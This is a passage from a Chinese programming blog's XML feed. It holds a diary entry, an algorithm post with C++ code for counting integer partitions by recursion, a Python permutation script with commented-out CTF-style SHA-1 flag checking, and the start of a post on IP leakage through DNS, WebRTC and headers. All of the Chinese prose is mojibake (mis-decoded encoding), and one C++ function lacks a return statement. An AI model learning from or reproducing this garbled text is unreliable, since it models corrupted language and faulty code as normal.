        <content type="html"><![CDATA[<p>ä»Šå¤©å¼€å§‹ï¼Œå›åˆ°ä»¥å¾€çš„å­¦ä¹ çŠ¶æ€å§ï¼ğŸ™‚</p><a id="more"></a><h1 id="2019å¹´5æœˆ23æ—¥â˜€"><a href="#2019å¹´5æœˆ23æ—¥â˜€" class="headerlink" title="2019å¹´5æœˆ23æ—¥â˜€"></a>2019å¹´5æœˆ23æ—¥â˜€</h1><blockquote><p>è·ä»Šå¾ˆä¹…æ²¡æ›´æ–°åšå®¢äº†ï¼Œä¸€æ–¹é¢å› ä¸ºæ‡’ï¼Œä¸€æ–¹é¢å› ä¸ºå­¦ä¹ çš„åœæ»ï¼Œå„æ–¹é¢åŸå› ã€‚</p><p>è€Œä»Šæ‰“ç®—å›åˆ°ä»¥å¾€çš„å­¦ä¹ çŠ¶æ€ï¼Œå› ä¸ºåªæœ‰è¿™æ ·ï¼Œæ‰æ˜¯å……å®çš„ï¼Œæœ‰è§„åˆ’æœ‰ç›®æ ‡çš„ğŸ˜„ã€‚</p></blockquote><h2 id="è¿™å‡ ä¸ªæœˆåšäº†ä»€ä¹ˆ"><a href="#è¿™å‡ ä¸ªæœˆåšäº†ä»€ä¹ˆ" class="headerlink" title="è¿™å‡ ä¸ªæœˆåšäº†ä»€ä¹ˆ"></a>è¿™å‡ ä¸ªæœˆåšäº†ä»€ä¹ˆ</h2><blockquote><p>è™½ç„¶è®¤è®¤çœŸçœŸåœ°çœ‹èµ°è¿‡æ¥çš„è¿™äº›æ—¥å­ï¼Œç¡®å®æ²¡åšä»€ä¹ˆå¤§äº‹ï¼Œåšçš„éƒ½æ˜¯å®é™…æ„ä¹‰ä¸å¤§çš„å°äº‹æƒ…ï¼Œè‡ªå·±çš„ä¸“ä¸šçŸ¥è¯†å’ŒæŠ€èƒ½ä¹Ÿå¹¶æ²¡æœ‰å¤šå¤§çš„è¿›æ­¥ï¼Œå¯ä»¥è¯´æ˜¯è™šåº¦äº†è®¸å¤šæ—¶å…‰ğŸ™ƒã€‚</p></blockquote><h2 id="æ—¶é—´ä¸å¤šäº†"><a href="#æ—¶é—´ä¸å¤šäº†" class="headerlink" title="æ—¶é—´ä¸å¤šäº†"></a>æ—¶é—´ä¸å¤šäº†</h2><blockquote><p>æ¥ä¸‹æ¥çš„æ—¶é—´ä¸å¤šäº†ï¼Œç¬¬å››ä¸ªå­¦æœŸä¹Ÿåˆ°äº†å°¾å£°ï¼Œä¸€è¾¹è¦å‡†å¤‡å‡ ä¸ªæ¯”èµ›å’Œé¡¹ç›®ï¼ˆå¤§å¤šæ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä½†ä¹Ÿå¾—å®Œæˆå®ƒä»¬æ‰è¡Œï¼‰ï¼Œä¸€è¾¹è¦æœŸæœ«å¤ä¹ ï¼Œä¸€è¾¹è¿˜å¾—å¼€å§‹æå‡åœæ»è®¸ä¹…ä¸å‰çš„æŠ€æœ¯å¹¿åº¦å’Œæ·±åº¦ã€‚</p><p>ä»»åŠ¡è‰°å·¨ï¼Œå…‰é˜´çè´µï¼Œå¸Œæœ›è‡ªå·±å¤šåšç‚¹æœ‰æ„ä¹‰çš„äº‹æƒ…å§ğŸ’ªï¼Œå’Œèº«è¾¹çš„äººå…±åŒå‰è¡Œï¼Œç›¸äº’æ‰¶æŒä¿ƒè¿›ï¼Œä»¥åè¦å¤šåœ¨æŠ€æœ¯æ–¹é¢è§è§ä¸–é¢å‘€ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Algorithm_Recursive_Tree</title>
      <link href="/2019/03/17/Algorithm-Recursive-Tree/"/>
      <url>/2019/03/17/Algorithm-Recursive-Tree/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜„ç®—æ³•å¤ªèœã€‚<br><a id="more"></a></p><h1 id="Algorithmâ€”â€”é€’å½’æ€æƒ³å’Œæ ‘"><a href="#Algorithmâ€”â€”é€’å½’æ€æƒ³å’Œæ ‘" class="headerlink" title="Algorithmâ€”â€”é€’å½’æ€æƒ³å’Œæ ‘"></a>Algorithmâ€”â€”é€’å½’æ€æƒ³å’Œæ ‘</h1><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>å€ŸåŠ©ä¸€ç®€å•çš„ç®—æ³•ç¨‹åºè®¾è®¡é¢˜æ¥ç†Ÿæ‚‰<code>é€’å½’æ€æƒ³</code>å’Œ<code>ç®€å•Tree</code>.</p><pre class=" language-c++"><code class="language-c++">é¢˜é¢ä¸ºï¼šç»™ä¸€ä¸ªæ­£æ•´æ•°nï¼Œæ±‚æœ‰å¤šå°‘ç§é0çš„æ•´æ•°ç»„åˆä¹‹å’Œç­‰äºn.ä¾‹å¦‚ï¼š    2=1+1      3=1+1+1      3=1+2</code></pre><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>é€šè¿‡æ ‘åˆ†æ”¯çš„æ–¹å¼æ¥å¯»æ‰¾ç­”æ¡ˆï¼Œæ ‘çš„æ ¹<code>root=1</code>ï¼Œç„¶åé€æ¸å¾ªç¯è·å–æ¯ä¸ªåˆ†æ”¯ä¹‹å’Œä¸ºnï¼Œå°äºnåˆ™ç»§ç»­æ‰©å±•ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317161546.png" alt=""></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span> </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;set></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> tree<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>string <span class="token function">sort_string</span><span class="token punctuation">(</span>string it<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    string tmp <span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp <span class="token operator">+</span><span class="token operator">=</span> arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span>set<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">get_set</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> atree<span class="token punctuation">)</span><span class="token punctuation">{</span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>atree<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">sort_string</span><span class="token punctuation">(</span>atree<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">int</span> head<span class="token punctuation">;</span>    cin<span class="token operator">>></span>num<span class="token punctuation">;</span>    <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>flag<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å»é‡å¤„ç† </span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> result <span class="token operator">=</span> <span class="token function">get_set</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> it<span class="token operator">=</span>result<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">!=</span>result<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>it<span class="token punctuation">)</span><span class="token punctuation">{</span>        cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span>it<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//    for(int i=0;i&lt;tree.size();++i){</span><span class="token comment" spellcheck="true">//        cout&lt;&lt;tree.at(i)&lt;&lt;endl;</span><span class="token comment" spellcheck="true">//    }</span><span class="token punctuation">}</span></code></pre><p>å¯ä»¥çœ‹åˆ°flagå˜é‡å¯¹åº”çš„å°±æ˜¯Treeçš„åˆ†æ”¯æ€»æ•°ï¼Œè€Œé¢˜ç›®è¦æ±‚çš„æ˜¯æ²¡æœ‰é‡å¤ç»„åˆçš„ç»“æœï¼Œåœ¨æ ‘çš„åˆ†æ”¯ä¸­å­˜åœ¨é‡å¤çš„èŠ‚ç‚¹ï¼Œä¾‹å¦‚æˆ‘ä»¬è¦è·å¾—<code>n=5</code>çš„ç»“æœï¼Œé‚£ä¹ˆ<code>1-3-1</code>å’Œ<code>1-1-3</code>ä¸¤ä¸ªåˆ†æ”¯å°±äº§ç”Ÿäº†é‡å¤ï¼Œæ­¤æ—¶å¯¹æ ‘çš„åˆ†æ”¯è¿›è¡Œç»“ç‚¹æ’åºï¼Œç„¶åé€šè¿‡é›†åˆå»é‡ï¼Œè¿™æ—¶å¾—åˆ°çš„æ‰æ˜¯çœŸæ­£çš„ç»“æœã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317162524.png" alt=""></p><p>å¦‚æœ<code>di_gui</code>ä¸ç”¨å…¨å±€å˜é‡flagçš„è¯ï¼Œå¯ä»¥æŠŠflagæ”¾å…¥æ–¹æ³•ä¸­ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">+</span><span class="token operator">=</span><span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h2><p>Pythonç‰ˆå›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²æ’åˆ—ç»„åˆï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">perm</span><span class="token punctuation">(</span>s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># è¿™é‡Œæ˜¯é€’å½’å‡½æ•°çš„å‡ºå£ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºè¿™é‡Œè¡¨ç¤ºï¼šä¸€ä¸ªé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²ï¼Œå®ƒçš„æ’åˆ—ç»„åˆå°±æ˜¯å®ƒè‡ªå·±ã€‚</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>s<span class="token punctuation">]</span>    sl<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#ä¿å­˜å­—ç¬¦ä¸²çš„æ‰€æœ‰å¯èƒ½æ’åˆ—ç»„åˆ</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#è¿™ä¸ªå¾ªç¯ï¼Œå¯¹åº” è§£é¢˜æ€è·¯1ï¼‰ç¡®å®šå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯è°ï¼Œæœ‰nç§å¯èƒ½ï¼ˆnä¸ºå­—ç¬¦ä¸²sçš„é•¿åº¦</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> perm<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#è¿™ä¸ªå¾ªç¯ï¼Œå¯¹åº” è§£é¢˜æ€è·¯2ï¼‰è¿›å…¥é€’å½’ï¼Œs[0:i]+s[i+1:]çš„æ„æ€å°±æ˜¯æŠŠsä¸­çš„s[i]ç»™å»æ‰</span>            sl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># å¯¹åº” è§£é¢˜æ€è·¯2ï¼‰é—®é¢˜å°±ä»â€œè¿”å›å­—ç¬¦ä¸²ä¸­çš„å­—æ¯æ’åˆ—ç»„åˆâ€ **å˜æˆäº†** â€œè¿”å› ç¬¬ä¸€ä¸ªå­—æ¯+é™¤å»ç¬¬ä¸€ä¸ªå­—æ¯å¤–çš„å­—ç¬¦ä¸²çš„æ’åˆ—ç»„åˆâ€</span>    <span class="token keyword">return</span> sl<span class="token keyword">def</span> <span class="token function">sha1</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># dict0 = '12eshcn'</span>    <span class="token comment" spellcheck="true"># dict1 = '!2eshcn'</span>    <span class="token comment" spellcheck="true"># dict2 = '!@eshcn'</span>    <span class="token comment" spellcheck="true"># dict3 = '1@eshcn'</span>    dicts <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true">#è¦æ’åˆ—ç»„åˆçš„å­—ç¬¦</span>    perm_nums<span class="token operator">=</span>perm<span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>perm_nums<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># for key in perm_nums:</span>    <span class="token comment" spellcheck="true">#      flag = "flag{%s}"%key</span>    <span class="token comment" spellcheck="true">#      if str(sha1(flag)) == "e6079c5ce56e781a50f4bf853cdb5302e0d8f054":</span>    <span class="token comment" spellcheck="true">#          print(flag)</span></code></pre><p>åŒæ ·æ˜¯é€’å½’ï¼‹Treeçš„æ–¹æ³•è·å–åˆ°ç»“æœã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> Tree </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>IPåŒ¿åæ€§ç ”ç©¶</title>
      <link href="/2019/02/21/IP%E5%8C%BF%E5%90%8D%E6%80%A7%E7%A0%94%E7%A9%B6/"/>
      <url>/2019/02/21/IP%E5%8C%BF%E5%90%8D%E6%80%A7%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity</p><a id="more"></a><h1 id="IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity"><a href="#IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity" class="headerlink" title="IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity"></a>IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity</h1><h2 id="ä½•è°“åŒ¿åï¼Ÿ"><a href="#ä½•è°“åŒ¿åï¼Ÿ" class="headerlink" title="ä½•è°“åŒ¿åï¼Ÿ"></a>ä½•è°“åŒ¿åï¼Ÿ</h2><blockquote><p>åŒ¿åå®šä¹‰ä¸º<strong>æœªçŸ¥å§“åæˆ–æœªç¡®å®šèº«ä»½</strong>ã€‚æˆ‘ä»¬ä¸Šç½‘æ—¶å¹¶æ²¡æœ‰åŒ¿åï¼Œå³ä½¿åœ¨ä½¿ç”¨éšç§å·¥å…·å¦‚Torã€Bitcoinæˆ–VPNçš„æ—¶å€™ã€‚æ¯é¡¹æœåŠ¡è‡³å°‘æœ‰ä¸€æ¡å¯ä»¥ç”¨äºåŒºåˆ†ä¸åŒç”¨æˆ·çš„ä¿¡æ¯ï¼Œæ— è®ºå…¶ä¸ºä¸€å¥—IPåœ°å€ï¼ˆVPNæˆ–Torï¼‰è¿˜æ˜¯ä¸€ä¸ªç”µå­é’±åŒ…ï¼ˆBitcoinï¼‰ã€‚è¿™ç§ä¿¡æ¯æœ¬èº«å¯èƒ½ä¸ä¼šæ³„éœ²ç”¨æˆ·çš„ä»»ä½•ç§äººä¿¡æ¯ï¼Œä½†å…¶å¯ä¸å…¶å®ƒç›¸ä¼¼ä¿¡æ¯è”ç³»èµ·æ¥ï¼Œæœ€ç»ˆç¡®å®šä¸ªäººçš„èº«ä»½ã€‚</p><p>VPNè™½ç„¶ä¸ä¼šä½¿å¾—æˆ‘ä»¬å®Œå…¨åŒ¿åï¼Œä½†å®ƒä¼šæå¤§å¢å¼ºä¸Šç½‘æ—¶çš„éšç§å’Œå®‰å…¨ã€‚</p></blockquote><p>æ—¢ç„¶ä¸å¯èƒ½åšåˆ°å®Œå…¨åŒ¿åï¼Œæˆ‘ä»¬åªèƒ½æé«˜ç›¸å¯¹åŒ¿åæ€§ï¼Œä»è€Œä½¿å¾—è‡ªå·±åœ¨ç½‘ç»œä¸­çš„<strong>éšç§åº¦æ›´é«˜</strong>ï¼Œ<strong>å®‰å…¨æ€§æ›´é«˜</strong>ã€‚</p><h2 id="ä¸€å®šçš„åŒ¿åæ€§æ˜¯æœ‰å¿…è¦çš„"><a href="#ä¸€å®šçš„åŒ¿åæ€§æ˜¯æœ‰å¿…è¦çš„" class="headerlink" title="ä¸€å®šçš„åŒ¿åæ€§æ˜¯æœ‰å¿…è¦çš„"></a>ä¸€å®šçš„åŒ¿åæ€§æ˜¯æœ‰å¿…è¦çš„</h2><p>äº’è”ç½‘æ—¶ä»£ï¼Œä¸ªäººéšç§çš„ä¿æŠ¤æ›´åŠ å¤æ‚ä¸å›°éš¾ï¼ŒäºŸå¾…å„ç§ä¿æŠ¤æ‰‹æ®µçš„æ›´æ–°å’Œåˆ›æ–°ã€‚æ¯”å¦‚åœ¨ç½‘ç»œç«‹æ³•å±‚é¢ï¼Œç›®å‰ä»æœ‰è®¸å¤šç©ºç™½ï¼Œç¼ºä¹ç›¸åº”çš„é¡¶å±‚è®¾è®¡ã€‚æœ‰å¿…è¦åœ¨ä¸ªäººä¿¡æ¯ä¿æŠ¤ã€ç”µå­å•†åŠ¡ç­‰é¢†åŸŸå»ºç«‹ä¸¥æ ¼å¥å…¨çš„æ³•å¾‹è§„å®šï¼Œåˆ’å®šäº’è”ç½‘æœåŠ¡å•†çš„â€œç¦åŒºâ€ï¼Œæ˜ç¡®æƒè´£ï¼Œè®©å¤„åœ¨å¼±åŠ¿çš„æ™®é€šç”¨æˆ·æ‹¥æœ‰çŸ¥æƒ…æƒã€é€‰æ‹©æƒä¸ç»´æƒçš„ä¾æ®ã€‚</p><p>å› è€Œåœ¨å½“ä»Šè¿™ä¸ªæ—¶ä»£ï¼Œä¸è®ºæ˜¯ä¿¡æ¯/ç½‘ç»œå®‰å…¨ä»ä¸šè€…ï¼Œè¿˜æ˜¯æ™®é€šç¾¤ä¼—éƒ½åº”è¯¥è‡ªä¸»åœ°å»æé«˜è‡ªå·±çš„å®‰å…¨æ„è¯†ï¼Œé€šè¿‡ä¸€äº›æªæ–½é˜²æ­¢è‡ªå·±çš„ä¿¡æ¯æ³„éœ²ã€‚</p><h2 id="ä»€ä¹ˆå› ç´ ä¼šæ³„éœ²ä½ çš„çœŸå®IPä¿¡æ¯ï¼Ÿ"><a href="#ä»€ä¹ˆå› ç´ ä¼šæ³„éœ²ä½ çš„çœŸå®IPä¿¡æ¯ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆå› ç´ ä¼šæ³„éœ²ä½ çš„çœŸå®IPä¿¡æ¯ï¼Ÿ"></a>ä»€ä¹ˆå› ç´ ä¼šæ³„éœ²ä½ çš„çœŸå®IPä¿¡æ¯ï¼Ÿ</h2><p>å¯ä»¥å°ç»“å‡ºä»¥ä¸‹å› ç´ ï¼š</p><ul><li>IPV4åœ°å€æ³„éœ²</li><li>IPV6åœ°å€æ³„éœ²</li><li>DNSæ³„éœ²</li><li>WebRTCæ³„éœ²</li><li>HTTPHeaderä¿¡æ¯æ³„éœ²</li><li>ç­‰ç­‰â€¦..</li></ul><h3 id="IPV4æ³„éœ²"><a href="#IPV4æ³„éœ²" class="headerlink" title="IPV4æ³„éœ²"></a>IPV4æ³„éœ²</h3><blockquote><p>IPv4ä½¿ç”¨32ä½ï¼ˆ4å­—èŠ‚ï¼‰åœ°å€ï¼Œå› æ­¤åœ°å€ç©ºé—´ä¸­åªæœ‰4,294,967,296ï¼ˆ232ï¼‰ä¸ªåœ°å€ã€‚ä¸è¿‡ï¼Œä¸€äº›åœ°å€æ˜¯ä¸ºç‰¹æ®Šç”¨é€”æ‰€ä¿ç•™çš„ï¼Œå¦‚ä¸“ç”¨ç½‘ç»œï¼ˆçº¦1800ä¸‡ä¸ªåœ°å€ï¼‰å’Œå¤šæ’­åœ°å€ï¼ˆçº¦2.7äº¿ä¸ªåœ°å€ï¼‰ï¼Œè¿™å‡å°‘äº†å¯åœ¨äº’è”ç½‘ä¸Šè·¯ç”±çš„åœ°å€æ•°é‡ã€‚éšç€åœ°å€ä¸æ–­è¢«åˆ†é…ç»™æœ€ç»ˆç”¨æˆ·ï¼ŒIPv4åœ°å€æ¯ç«­é—®é¢˜ä¹Ÿåœ¨éšä¹‹äº§ç”Ÿã€‚åŸºäºåˆ†ç±»ç½‘ç»œã€æ— ç±»åˆ«åŸŸé—´è·¯ç”±å’Œç½‘ç»œåœ°å€è½¬æ¢çš„åœ°å€ç»“æ„é‡æ„æ˜¾è‘—åœ°å‡å°‘äº†åœ°å€æ¯ç«­çš„é€Ÿåº¦ã€‚ä½†åœ¨2011å¹´2æœˆ3æ—¥ï¼Œåœ¨æœ€å5ä¸ªåœ°å€å—è¢«åˆ†é…ç»™5ä¸ªåŒºåŸŸäº’è”ç½‘æ³¨å†Œç®¡ç†æœºæ„ä¹‹åï¼ŒIANAçš„ä¸»è¦åœ°å€æ± 